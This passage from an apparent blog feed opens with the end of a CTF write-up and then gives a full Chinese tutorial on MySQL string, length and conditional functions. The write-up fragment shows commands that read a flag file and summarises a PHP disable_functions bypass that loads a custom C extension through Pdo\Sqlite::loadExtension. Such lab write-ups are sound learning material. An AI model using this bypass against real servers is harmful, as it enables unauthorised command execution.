-la /</code>，发现目标文件。</li><li>再次修改为 <code>cat /flag_cdcas &gt; result.txt</code>。</li><li>运行脚本，成功获得回显。</li></ol><p><strong>Flag:</strong> <code>flag&#123;hello_world_935a00069646&#125;</code></p><h2 id="六、-总结"><a href="#六、-总结" class="headerlink" title="六、 总结"></a>六、 总结</h2><p>本题考察的核心技术点是 <strong>利用 PHP 扩展机制绕过 disable_functions</strong>。<br>通过编写 C 语言扩展，利用 <code>Pdo\Sqlite::loadExtension</code> 在进程空间内直接执行系统命令。难点在于二进制文件的传输（Base64处理）以及服务器文件路径的探测与适配。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> SQLite </tag>
            
            <tag> 绕过 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 常见函数笔记</title>
      <link href="/2026/01/18/SQL%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/2026/01/18/SQL%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文整理了 MySQL 中常用的 SQL 函数，包括字符串处理、字符编码、长度计算和条件判断等，每个函数都配有通俗易懂的说明和实用示例。</p></blockquote><h2 id="一、常用内置函数：查看当前环境信息"><a href="#一、常用内置函数：查看当前环境信息" class="headerlink" title="一、常用内置函数：查看当前环境信息"></a>一、常用内置函数：查看当前环境信息</h2><p>这三个函数可以帮助你快速了解当前的数据库连接信息，非常实用！</p><h3 id="USER-查看当前登录账号"><a href="#USER-查看当前登录账号" class="headerlink" title="USER() - 查看当前登录账号"></a><code>USER()</code> - 查看当前登录账号</h3><p><strong>作用</strong>：返回当前连接的数据库账号和来源地址</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();</span><br><span class="line"><span class="comment">-- 结果示例：root@localhost</span></span><br><span class="line"><span class="comment">-- 格式：账号名@来源地址</span></span><br></pre></td></tr></table></figure><h3 id="DATABASE-查看当前使用的数据库"><a href="#DATABASE-查看当前使用的数据库" class="headerlink" title="DATABASE() - 查看当前使用的数据库"></a><code>DATABASE()</code> - 查看当前使用的数据库</h3><p><strong>作用</strong>：返回当前正在使用的数据库名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br><span class="line"><span class="comment">-- 结果示例：mydb</span></span><br><span class="line"><span class="comment">-- 注意：如果没有使用 USE 命令选择数据库，可能返回 NULL</span></span><br></pre></td></tr></table></figure><h3 id="VERSION-查看数据库版本"><a href="#VERSION-查看数据库版本" class="headerlink" title="VERSION() - 查看数据库版本"></a><code>VERSION()</code> - 查看数据库版本</h3><p><strong>作用</strong>：返回 MySQL 数据库的版本号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> VERSION();</span><br><span class="line"><span class="comment">-- 结果示例：8.0.33</span></span><br></pre></td></tr></table></figure><h3 id="一次性查询所有信息"><a href="#一次性查询所有信息" class="headerlink" title="一次性查询所有信息"></a>一次性查询所有信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>(), DATABASE(), VERSION();</span><br><span class="line"><span class="comment">-- 一次性获取账号、数据库名和版本号</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、字符串截取函数：灵活提取字符串片段"><a href="#二、字符串截取函数：灵活提取字符串片段" class="headerlink" title="二、字符串截取函数：灵活提取字符串片段"></a>二、字符串截取函数：灵活提取字符串片段</h2><p>字符串截取是 SQL 中最常用的操作之一，MySQL 提供了多种函数来实现这个功能。</p><h3 id="2-1-SUBSTRING-SUBSTR-MID-从指定位置截取"><a href="#2-1-SUBSTRING-SUBSTR-MID-从指定位置截取" class="headerlink" title="2.1 SUBSTRING() &#x2F; SUBSTR() &#x2F; MID() - 从指定位置截取"></a>2.1 <code>SUBSTRING()</code> &#x2F; <code>SUBSTR()</code> &#x2F; <code>MID()</code> - 从指定位置截取</h3><p>这三个函数在 MySQL 中<strong>完全等价</strong>，你可以根据习惯选择任意一个使用。</p><p><strong>语法格式</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SUBSTRING</span>(字符串, 起始位置)</span><br><span class="line"><span class="built_in">SUBSTRING</span>(字符串, 起始位置, 截取长度)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以下写法效果相同</span></span><br><span class="line">SUBSTR(字符串, 起始位置, 截取长度)</span><br><span class="line">MID(字符串, 起始位置, 截取长度)</span><br></pre></td></tr></table></figure><p><strong>重要规则</strong>：</p><ul><li>⚠️ <strong>起始位置从 1 开始</strong>（不是 0！）</li><li>✅ 起始位置可以是负数：负数表示从字符串末尾往前数</li><li>✅ 如果省略截取长度，则取到字符串末尾</li></ul><p><strong>实用示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从第1个字符开始，取3个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">1</span>, <span class="number">3</span>);   <span class="comment">-- 结果：abc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从第3个字符开始，取到末尾</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);          <span class="comment">-- 结果：cdef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从第2个字符开始，取4个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> MID(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">2</span>, <span class="number">4</span>);          <span class="comment">-- 结果：bcde</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用负数：从倒数第2个字符开始取到末尾</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">-2</span>);      <span class="comment">-- 结果：ef</span></span><br></pre></td></tr></table></figure><h3 id="2-2-LEFT-从左边截取"><a href="#2-2-LEFT-从左边截取" class="headerlink" title="2.2 LEFT() - 从左边截取"></a>2.2 <code>LEFT()</code> - 从左边截取</h3><p><strong>作用</strong>：从字符串的左边开始截取指定长度的字符</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LEFT</span>(字符串, 长度)</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);           <span class="comment">-- 结果：abc（取左边3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="keyword">USER</span>(), <span class="number">4</span>);             <span class="comment">-- 取当前账号的前4个字符</span></span><br></pre></td></tr></table></figure><h3 id="2-3-RIGHT-从右边截取"><a href="#2-3-RIGHT-从右边截取" class="headerlink" title="2.3 RIGHT() - 从右边截取"></a>2.3 <code>RIGHT()</code> - 从右边截取</h3><p><strong>作用</strong>：从字符串的右边开始截取指定长度的字符</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RIGHT</span>(字符串, 长度)</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);          <span class="comment">-- 结果：def（取右边3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(VERSION(), <span class="number">3</span>);         <span class="comment">-- 取版本号的最后3个字符</span></span><br></pre></td></tr></table></figure><h3 id="2-4-常见组合用法"><a href="#2-4-常见组合用法" class="headerlink" title="2.4 常见组合用法"></a>2.4 常见组合用法</h3><h4 id="取第-n-位字符（只取1个字符）"><a href="#取第-n-位字符（只取1个字符）" class="headerlink" title="取第 n 位字符（只取1个字符）"></a>取第 n 位字符（只取1个字符）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>);   <span class="comment">-- 结果：d（第4个字符）</span></span><br></pre></td></tr></table></figure><h4 id="提取前缀或后缀"><a href="#提取前缀或后缀" class="headerlink" title="提取前缀或后缀"></a>提取前缀或后缀</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取数据库名的首字母</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(DATABASE(), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取账号的后缀部分（如 @localhost）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="keyword">USER</span>(), <span class="number">9</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="三、字符编码相关函数：字符与数字的转换"><a href="#三、字符编码相关函数：字符与数字的转换" class="headerlink" title="三、字符编码相关函数：字符与数字的转换"></a>三、字符编码相关函数：字符与数字的转换</h2><h3 id="3-1-ASCII-获取字符的编码值"><a href="#3-1-ASCII-获取字符的编码值" class="headerlink" title="3.1 ASCII() - 获取字符的编码值"></a>3.1 <code>ASCII()</code> - 获取字符的编码值</h3><p><strong>作用</strong>：返回字符串<strong>第一个字符</strong>的 ASCII 编码值（数字）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(字符串)</span><br></pre></td></tr></table></figure><p><strong>重要规则</strong>：</p><ul><li>只取第一个字符（<code>&#39;abc&#39;</code> 只看 <code>&#39;a&#39;</code>）</li><li>空字符串 <code>&#39;&#39;</code> → 返回 <code>0</code></li><li><code>NULL</code> → 返回 <code>NULL</code></li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;A&#x27;</span>);        <span class="comment">-- 结果：65</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;a&#x27;</span>);        <span class="comment">-- 结果：97（小写字母）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;0&#x27;</span>);        <span class="comment">-- 结果：48（数字0）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;abc&#x27;</span>);      <span class="comment">-- 结果：97（只看第一个字符&#x27;a&#x27;）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;&#x27;</span>);         <span class="comment">-- 结果：0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="keyword">NULL</span>);       <span class="comment">-- 结果：NULL</span></span><br></pre></td></tr></table></figure><p><strong>配合截取函数使用</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取 &#x27;admin&#x27; 第1个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>));  <span class="comment">-- 结果：97</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取 &#x27;admin&#x27; 第2个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>));  <span class="comment">-- 结果：100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前账号第1个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(), <span class="number">1</span>, <span class="number">1</span>));</span><br></pre></td></tr></table></figure><h3 id="3-2-CHAR-将编码值转换为字符"><a href="#3-2-CHAR-将编码值转换为字符" class="headerlink" title="3.2 CHAR() - 将编码值转换为字符"></a>3.2 <code>CHAR()</code> - 将编码值转换为字符</h3><p><strong>作用</strong>：把数字编码转换成对应的字符（与 <code>ASCII()</code> 互逆）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CHAR</span>(编码值)</span><br><span class="line"><span class="type">CHAR</span>(编码<span class="number">1</span>, 编码<span class="number">2</span>, 编码<span class="number">3</span>, ...)  <span class="comment">-- 可以一次转换多个字符</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>(<span class="number">65</span>);              <span class="comment">-- 结果：&#x27;A&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>(<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>);        <span class="comment">-- 结果：&#x27;abc&#x27;（97=a, 98=b, 99=c）</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="type">CHAR</span>(<span class="number">97</span>), <span class="string">&#x27;dm&#x27;</span>);<span class="comment">-- 结果：&#x27;adm&#x27;（拼接字符串）</span></span><br></pre></td></tr></table></figure><h3 id="ASCII-编码对照表"><a href="#ASCII-编码对照表" class="headerlink" title="ASCII 编码对照表"></a>ASCII 编码对照表</h3><table><thead><tr><th>十进制</th><th>十六进制</th><th>字符</th><th></th><th>十进制</th><th>十六进制</th><th>字符</th></tr></thead><tbody><tr><td>48</td><td>30</td><td>0</td><td></td><td>65</td><td>41</td><td>A</td></tr><tr><td>49</td><td>31</td><td>1</td><td></td><td>66</td><td>42</td><td>B</td></tr><tr><td>50</td><td>32</td><td>2</td><td></td><td>67</td><td>43</td><td>C</td></tr><tr><td>51</td><td>33</td><td>3</td><td></td><td>68</td><td>44</td><td>D</td></tr><tr><td>52</td><td>34</td><td>4</td><td></td><td>69</td><td>45</td><td>E</td></tr><tr><td>53</td><td>35</td><td>5</td><td></td><td>70</td><td>46</td><td>F</td></tr><tr><td>54</td><td>36</td><td>6</td><td></td><td>71</td><td>47</td><td>G</td></tr><tr><td>55</td><td>37</td><td>7</td><td></td><td>72</td><td>48</td><td>H</td></tr><tr><td>56</td><td>38</td><td>8</td><td></td><td>73</td><td>49</td><td>I</td></tr><tr><td>57</td><td>39</td><td>9</td><td></td><td>74</td><td>4A</td><td>J</td></tr><tr><td>…</td><td>…</td><td>…</td><td></td><td>…</td><td>…</td><td>…</td></tr><tr><td>97</td><td>61</td><td>a</td><td></td><td>122</td><td>7A</td><td>z</td></tr></tbody></table><p><strong>常用字符编码速查</strong>：</p><ul><li>数字 0-9：48-57</li><li>大写字母 A-Z：65-90</li><li>小写字母 a-z：97-122</li></ul><hr><h2 id="四、字符串长度函数：字节长度-vs-字符长度"><a href="#四、字符串长度函数：字节长度-vs-字符长度" class="headerlink" title="四、字符串长度函数：字节长度 vs 字符长度"></a>四、字符串长度函数：字节长度 vs 字符长度</h2><h3 id="4-1-LENGTH-返回字节长度"><a href="#4-1-LENGTH-返回字节长度" class="headerlink" title="4.1 LENGTH() - 返回字节长度"></a>4.1 <code>LENGTH()</code> - 返回字节长度</h3><p><strong>作用</strong>：返回字符串占用的<strong>字节数</strong>（bytes）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LENGTH(字符串)</span><br></pre></td></tr></table></figure><p><strong>重要说明</strong>：</p><ul><li>⚠️ 这是<strong>字节长度</strong>，不是字符个数！</li><li>在 UTF-8 编码下：<ul><li>英文字符：1 字节&#x2F;字符</li><li>中文字符：通常 3 字节&#x2F;字符</li><li>Emoji 表情：通常 4 字节&#x2F;字符</li></ul></li><li>所以 <code>LENGTH()</code> 的结果可能大于实际字符数</li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;abc&#x27;</span>);        <span class="comment">-- 结果：3（3个英文字符 = 3字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;&#x27;</span>);            <span class="comment">-- 结果：0</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="keyword">NULL</span>);          <span class="comment">-- 结果：NULL</span></span><br></pre></td></tr></table></figure><h3 id="4-2-CHAR-LENGTH-CHARACTER-LENGTH-返回字符个数"><a href="#4-2-CHAR-LENGTH-CHARACTER-LENGTH-返回字符个数" class="headerlink" title="4.2 CHAR_LENGTH() &#x2F; CHARACTER_LENGTH() - 返回字符个数"></a>4.2 <code>CHAR_LENGTH()</code> &#x2F; <code>CHARACTER_LENGTH()</code> - 返回字符个数</h3><p><strong>作用</strong>：返回字符串的<strong>字符个数</strong>（characters），更符合”有多少个字”的直观理解</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CHAR_LENGTH</span>(字符串)</span><br><span class="line"><span class="keyword">CHARACTER_LENGTH</span>(字符串)  <span class="comment">-- 与 CHAR_LENGTH() 完全等价</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;abc&#x27;</span>);       <span class="comment">-- 结果：3（3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHARACTER_LENGTH</span>(<span class="string">&#x27;abc&#x27;</span>);  <span class="comment">-- 结果：3（同上）</span></span><br></pre></td></tr></table></figure><h3 id="4-3-长度函数的区别对比"><a href="#4-3-长度函数的区别对比" class="headerlink" title="4.3 长度函数的区别对比"></a>4.3 长度函数的区别对比</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 英文：字节数 = 字符数</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;hello&#x27;</span>);        <span class="comment">-- 5（字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;hello&#x27;</span>);   <span class="comment">-- 5（字符）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 中文：字节数 &gt; 字符数</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;你好&#x27;</span>);         <span class="comment">-- 6（字节，每个汉字3字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;你好&#x27;</span>);    <span class="comment">-- 2（字符，2个汉字）</span></span><br></pre></td></tr></table></figure><h3 id="4-4-常见组合用法"><a href="#4-4-常见组合用法" class="headerlink" title="4.4 常见组合用法"></a>4.4 常见组合用法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前账号/数据库名/版本号的长度（建议用 CHAR_LENGTH）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="keyword">USER</span>());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(DATABASE());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(VERSION());</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合截取：取第 n 位字符（从 1 开始计数）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(), <span class="number">1</span>, <span class="number">1</span>);      <span class="comment">-- 第1个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">2</span>, <span class="number">1</span>);  <span class="comment">-- 第2个字符</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、条件判断函数：让-SQL-更智能"><a href="#五、条件判断函数：让-SQL-更智能" class="headerlink" title="五、条件判断函数：让 SQL 更智能"></a>五、条件判断函数：让 SQL 更智能</h2><h3 id="5-1-IF-三元条件判断"><a href="#5-1-IF-三元条件判断" class="headerlink" title="5.1 IF() - 三元条件判断"></a>5.1 <code>IF()</code> - 三元条件判断</h3><p><strong>作用</strong>：根据条件返回不同的值（类似编程语言的三元表达式）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(条件, 条件为真时的值, 条件为假时的值)</span><br></pre></td></tr></table></figure><p><strong>规则</strong>：</p><ul><li>条件为 TRUE（非0且非NULL）→ 返回第二个参数</li><li>条件为 FALSE（0 或 NULL）→ 返回第三个参数</li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基本用法</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);          <span class="comment">-- 结果：yes</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);          <span class="comment">-- 结果：no</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="keyword">NULL</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);         <span class="comment">-- 结果：no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数值比较</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">5</span><span class="operator">&gt;</span><span class="number">3</span>, <span class="number">100</span>, <span class="number">200</span>);             <span class="comment">-- 结果：100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合字符串函数：判断账号第1位是否为 &#x27;r&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合 ASCII：判断第1位字符编码是否大于 100</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(ASCII(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="5-2-IFNULL-处理-NULL-值"><a href="#5-2-IFNULL-处理-NULL-值" class="headerlink" title="5.2 IFNULL() - 处理 NULL 值"></a>5.2 <code>IFNULL()</code> - 处理 NULL 值</h3><p><strong>作用</strong>：如果第一个值为 NULL，则返回第二个值（默认值），否则返回第一个值</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(值<span class="number">1</span>, 默认值)</span><br></pre></td></tr></table></figure><p><strong>使用场景</strong>：避免 NULL 值导致的问题，提供默认值</p><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IFNULL(<span class="keyword">NULL</span>, <span class="string">&#x27;fallback&#x27;</span>);      <span class="comment">-- 结果：fallback</span></span><br><span class="line"><span class="keyword">SELECT</span> IFNULL(<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;fallback&#x27;</span>);     <span class="comment">-- 结果：abc</span></span><br><span class="line"><span class="keyword">SELECT</span> IFNULL(DATABASE(), <span class="string">&#x27;no_db&#x27;</span>);   <span class="comment">-- 未选择数据库时返回 &#x27;no_db&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="5-3-NULLIF-相等时返回-NULL"><a href="#5-3-NULLIF-相等时返回-NULL" class="headerlink" title="5.3 NULLIF() - 相等时返回 NULL"></a>5.3 <code>NULLIF()</code> - 相等时返回 NULL</h3><p><strong>作用</strong>：如果两个值相等，返回 NULL；否则返回第一个值</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NULLIF</span>(值<span class="number">1</span>, 值<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>使用场景</strong>：将特定值转换为 NULL（常用于数据清洗）</p><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="number">5</span>, <span class="number">5</span>);                  <span class="comment">-- 结果：NULL（相等）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="number">5</span>, <span class="number">3</span>);                  <span class="comment">-- 结果：5（不相等）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);              <span class="comment">-- 结果：&#x27;a&#x27;（不相等）</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 MySQL 中最常用的 SQL 函数：</p><ol><li><strong>环境信息函数</strong>：<code>USER()</code>, <code>DATABASE()</code>, <code>VERSION()</code> - 快速了解当前连接信息</li><li><strong>字符串截取</strong>：<code>SUBSTRING()</code>, <code>LEFT()</code>, <code>RIGHT()</code> - 灵活提取字符串片段</li><li><strong>字符编码</strong>：<code>ASCII()</code>, <code>CHAR()</code> - 字符与数字编码的相互转换</li><li><strong>长度计算</strong>：<code>LENGTH()</code>, <code>CHAR_LENGTH()</code> - 字节长度 vs 字符长度</li><li><strong>条件判断</strong>：<code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code> - 让 SQL 逻辑更灵活</li></ol><p>掌握这些函数，可以让你在 SQL 查询中更加得心应手！</p><hr><p><strong>提示</strong>：在实际使用中，这些函数经常组合使用，比如 <code>ASCII(SUBSTRING(USER(), 1, 1))</code> 可以获取账号首字符的编码值。多练习组合使用，能解决很多实际问题！</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
